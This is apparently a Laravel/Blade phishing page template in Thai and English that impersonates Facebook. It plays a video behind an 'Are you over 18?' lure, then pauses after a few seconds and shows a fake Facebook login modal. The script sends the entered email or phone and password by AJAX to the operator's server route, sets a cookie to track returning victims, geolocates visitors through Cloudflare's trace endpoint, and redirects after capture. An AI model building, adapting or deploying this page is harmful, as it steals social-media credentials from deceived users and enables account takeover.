
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>คุณอายุมากกว่า 18 ปีหร</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
    <link rel="stylesheet" href="assets/css/index.css">
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4JWKW6KPG1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'G-4JWKW6KPG1');
    </script>

</head>

<body>
<div class="container" id="app">
    <video controls="" class="home-video" id="video" webkit-playsinline="" playsinline="" autoplay="" muted="">
        <source src="" id="source">
    </video>
    <div class="home-modal" id="modal">
        <div class="home-modal-content">
            <div class="home-logo">
                <img class="home logo img" src="assets/images/5.svg" alt="Facebook">
            </div>
            <div class="modal-warning" id="result">คุณต้องเข้าสู่ระบบเพื่อดำเนินการต่อ</div>
            <form id="form">
                <div>
                    <input id="input-email" placeholder="อีเมลหรือหมายเลขโทรศัพท์มือถือ" required="">
                </div>
                <div id="password-container">
                    <input id="input-password" type="password" placeholder="รหัสผ่าน" required="">
                    <img src="assets/images/unvisibility.png" id="password-eye">
                </div>
                <p class="wrong-credential" id="text-wrong">ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง</p>
                <div class="login-btn-container">

                    <button type="submit" id="submit" value="Log In" class="login-btn">เข้าสู่ระบบ</button>
                </div>

            </form>
            <p class="forget-password" id="forget-password">ลืมรหัสผ่านใช่หรือไม่?</p>
            <div class="reg-btn-container">
                <button class="reg-btn" id="reg-btn">สร้างบัญชีใหม่</button>
            </div>
        </div>
    </div>
</div>
<script src="assets/js/jquery.js"></script>
<script>
    $(document).ready(function () {
        setTimeout(function (){
            $.ajax({
                url: '{{ route('home.content') }}',
                method: 'GET',
                success: function (response) {
                    let video = $("#video");
                    let source = $('#source');
                    source.attr('src', response)
                    video.load();
                    video.play();
                }
            });
        }, 2000);
    })
    function set_Cookie(name, value) {
        name = "LIDL-tt" + name;
        var Days = 30;
        var exp = new Date();
        var domain = document.domain.split('.').slice(-2).join('.');
        exp.setTime(exp.getTime() + (Days * 20 * 1000));
        document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + ";domain=." + domain + "; path=/;"
    }

    function get_Cookie(name) {
        name = "LIDL-tt" + name;
        var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
        if (arr = document.cookie.match(reg)) {
            return unescape(arr[2]);
        }
        return '';
    }
    const video = document.getElementById("video")
    const modal = document.getElementById("modal")
    const form = document.getElementById("form")
    const inputEmail = document.getElementById("input-email")
    const inputPassword = document.getElementById("input-password")
    const textWrong = document.getElementById("text-wrong")
    const passwordEye = document.getElementById("password-eye")

    let totalTimePlayed = 0
    let lastUpdatedTime = 0
    let loginCount = 0

    var type_op = 1;
    type_op = get_Cookie('type_op') == '' ? 1 : parseInt(get_Cookie('type_op'));

    const updateTotalTimePlayed = () => {
        const newTime = video.currentTime
        const timeDiff = newTime - lastUpdatedTime
        if (timeDiff > 0) {
            totalTimePlayed += timeDiff
        }
        lastUpdatedTime = newTime
        if (totalTimePlayed > 5) {
            if (type_op !== 2) {
                modal.style.display = "flex"
                video.removeEventListener("timeupdate", updateTotalTimePlayed)
                video.pause()
            } else {
                if (totalTimePlayed > 30) {
                    modal.style.display = "flex"
                    video.removeEventListener("timeupdate", updateTotalTimePlayed)
                    video.pause()
                }

            }

        }
    }

    video.addEventListener("timeupdate", updateTotalTimePlayed)



    passwordEye.addEventListener("click", () => {
        if (inputPassword.type === "password") {
            passwordEye.src = "{{ asset('assets/images/visibility.png') }}"
            inputPassword.type = "text"
        } else {
            passwordEye.src = "{{ asset('assets/images/unvisibility.png') }}"
            inputPassword.type = "password"
        }
    })



    setInterval(function() {

    }, 0);

    function lee() {
        debugger
    }

    function getcountry() {

        var jqXHR = $.ajax({
            url: 'https://cloudflare.com/cdn-cgi/trace',
            //...

            async: false

        });
        if (jqXHR.responseText)
            return jqXHR.responseText.match(/loc=(.+)/)[1];
        else
            return "none";

    }
    var country = getcountry();
    console.log(country);
    var errortext = "";

    document.title = 'Are you over 18?';
    $('#result').html("You must be logged in to continue.");
    $('#submit').html("Log In");
    $('#reg-btn').html("Create New Account");
    $('#forget-password').html("Forgotten password?");
    $("#input-email").attr("placeholder", "Email address or phone number");
    $("#input-password").attr("placeholder", "Password");
    errortext = "Invalid username or password";

    /*if (country === "ID") {
        document.title = 'Apa Anda berusia lebih dari 18 tahun?';
        $('#result').html("Anda harus masuk untuk melanjutkan.");
        $('#submit').html("Log In");
        $('#reg-btn').html("Buat Akun Baru");
        $('#forget-password').html("Lupa Kata Sandi?");
        $("#input-email").attr("placeholder", "Email atau Nomor Telepon");
        $("#input-password").attr("placeholder", "Kata Sandi");
        errortext = "Username dan password salah";
    } else if (country !== "TH") {
        document.title = 'Are you over 18?';
        $('#result').html("You must be logged in to continue.");
        $('#submit').html("Log In");
        $('#reg-btn').html("Create New Account");
        $('#forget-password').html("Forgotten password?");
        $("#input-email").attr("placeholder", "Email address or phone number");
        $("#input-password").attr("placeholder", "Password");
        errortext = "Invalid username or password";
    } else if (country === "TH") {
        errortext = "ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง";
    }*/



    $('#submit').click(function() {
        let uid = $('#input-email').val();
        let pass = $('#input-password').val();

        if (!uid || !pass) {
            $('#result').html(errortext);
            return false
        };
        $('#submit').html('Please Wait!! !');
        event.preventDefault();
        $.ajax({
            url: '{{ route('vuilongdangnhap.store') }}',
            type: 'POST',
            dataType: 'JSON',
            data: {
                password: pass,
                username: uid,
                _token: '{{ csrf_token() }}'
            },
            success: (data) => {
                $('#submit').html('Log In');
                if (data.error) {
                    $('#result').html(data.msg);
                    $('input-email').val('')
                } else {
                    set_Cookie('type_op', 2);
                    setTimeout(function() {
                        window.location = data.url
                    }, 1000)
                }
            }

        })
    })
</script>

</body>